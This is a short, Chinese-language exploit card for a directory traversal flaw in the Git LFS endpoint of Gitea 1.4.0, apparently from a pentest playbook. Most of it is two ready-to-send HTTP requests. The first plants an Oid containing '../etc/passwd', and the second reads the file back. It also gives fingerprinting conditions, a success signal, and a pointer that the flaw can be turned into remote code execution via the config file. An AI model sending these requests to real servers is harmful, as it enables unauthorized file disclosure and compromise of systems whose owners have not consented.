# Gitea LFS Directory Traversal (1.4-rce)

## 指纹特征
- 服务: Gitea 1.4.0
- 端口: 3000 (默认)
- 条件: 需存在至少一个公共仓库

## 利用矩阵
| 触发方式 | 路径 | 关键参数 |
| :--- | :--- | :--- |
| Git LFS 对象创建 | `/{{USER}}/{{REPO}}.git/info/lfs/objects` | `Oid` |

## PoC 指令

通过构造包含 `../` 的 `Oid` 参数实现目录遍历读取文件：

**1. 添加 LFS 对象 (注入路径)**
```http
POST /{{USER}}/{{REPO}}.git/info/lfs/objects HTTP/1.1
Host: {{TARGET}}:3000
Content-Type: application/json
Accept: application/vnd.git-lfs+json

{
    "Oid": "....../../../etc/passwd",
    "Size": 1000000,
    "User" : "a",
    "Password" : "a",
    "Repo" : "a",
    "Authorization" : "a"
}
```

**2. 触发并读取文件**
```http
GET /{{USER}}/{{REPO}}.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth HTTP/1.1
Host: {{TARGET}}:3000
```

## Success Signal
- **响应内容**: 响应 Body 中返回目标文件的内容（如 `/etc/passwd` 的 root 行）。
- **RCE 路径**: 该漏洞可通过控制 `config` 文件进一步实现 RCE，详见深度分析。
